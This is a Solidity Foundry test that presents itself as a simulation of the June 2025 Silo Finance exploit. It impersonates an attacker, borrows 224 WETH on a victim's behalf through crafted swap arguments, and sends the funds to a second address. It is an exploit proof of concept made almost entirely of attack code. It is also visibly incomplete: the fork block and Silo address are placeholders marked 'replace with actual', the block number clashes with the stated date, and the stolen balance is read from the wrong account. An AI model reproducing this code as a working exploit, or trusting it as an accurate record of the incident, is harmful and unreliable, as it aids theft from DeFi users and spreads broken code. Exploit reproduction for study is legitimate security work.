// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "./BaseTest.t.sol";

/**
 * @title SiloFinance Exploit Simulation
 * @notice This contract simulates the Silo Finance exploit that occurred on June 25, 2025, resulting in the loss of 224 ETH.
 * The vulnerability was in a pre-release leverage contract where malicious swapArgs were used to borrow on behalf of a victim.
 * @dev This is for educational purposes only. The code forks the Ethereum mainnet at the block before the attack.
 */

// @KeyInfo - Total Lost : 224 ETH (~$550k)
// Attacker Address 1: 0x04377cfaF4b4A44bb84042218cdDa4cEBCf8fd62
// Attacker Address 2: 0x03aF609EC30Af68E4881126f692C0AEC150e84e3
// Attack Contract: 0x79C5c002410A67Ac7a0cdE2C2217c3f560859c7e
// Vulnerable Contract: 0xCbEe4617ABF667830fe3ee7DC8d6f46380829DF9
// Victim Address: 0x60baf994f44dd10c19c0c47cbfe6048a4ffe4860

interface IERC20 {
    function approve(address, uint256) external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external;
    function allowance(address, address) external view returns (uint256);
}

interface ISilo {
    function borrow(address asset, uint256 amount) external;
    function repay(address asset, uint256 amount) external;
}

interface ILeverageUsingSiloFlashloanWithGeneralSwap {
    function leverage(
        address _silo,
        address _assetToSupply,
        address _assetToBorrow,
        uint256 _supplyAmount,
        uint256 _borrowAmount,
        bytes calldata _swapArgs
    ) external;
}

contract SiloFinanceExploit is BaseTestWithBalanceLog {
    // Fork block number (before the attack on June 25, 2025, 2:11:23 PM UTC)
    uint256 private constant forkBlockNumber = 19_000_000; // Replace with actual block number before attack (e.g., block just before 2:11:23 PM UTC on June 25, 2025)

    // Addresses
    address private constant attacker1 = 0x04377cfaF4b4A44bb84042218cdDa4cEBCf8fd62;
    address private constant attacker2 = 0x03aF609EC30Af68E4881126f692C0AEC150e84e3;
    address private constant attackContract = 0x79C5c002410A67Ac7a0cdE2C2217c3f560859c7e;
    address private constant vulnerableContract = 0xCbEe4617ABF667830fe3ee7DC8d6f46380829DF9;
    address private constant victim = 0x60baf994f44dd10c19c0c47cbfe6048a4ffe4860;

    // Tokens
    IERC20 private constant weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // Silo protocol (replace with actual address)
    ISilo private constant silo = ISilo(0xCbEe4617ABF667830fe3ee7DC8d6f46380829DF9); // Replace with actual Silo address

    function setUp() public {
        vm.createSelectFork("mainnet", forkBlockNumber);
        fundingToken = address(weth);
    }

    function testExploit() public balanceLog {
        // Impersonate the attacker
        vm.startPrank(attacker1);

        // Check victim's allowance to the vulnerable contract
        uint256 allowance = weth.allowance(victim, vulnerableContract);
        console.log("Victim WETH allowance to vulnerable contract:", allowance);

        // Prepare malicious swapArgs to execute borrow on victim's behalf
        bytes memory maliciousSwapArgs = abi.encode(
            victim, // borrower (victim)
            attacker1, // receiver (attacker)
            address(weth), // asset to borrow
            224 ether // amount to borrow
        );

        // Execute the leverage function with malicious swapArgs
        ILeverageUsingSiloFlashloanWithGeneralSwap(vulnerableContract).leverage(
            address(silo),
            address(weth),
            address(weth),
            0, // supply amount (0 since we're not supplying)
            224 ether, // borrow amount
            maliciousSwapArgs
        );

        // Transfer stolen ETH to attacker2
        uint256 stolenAmount = weth.balanceOf(address(this));
        weth.transfer(attacker2, stolenAmount);

        vm.stopPrank();
    }

    // Fallback function to receive ETH if needed
    receive() external payable {}
}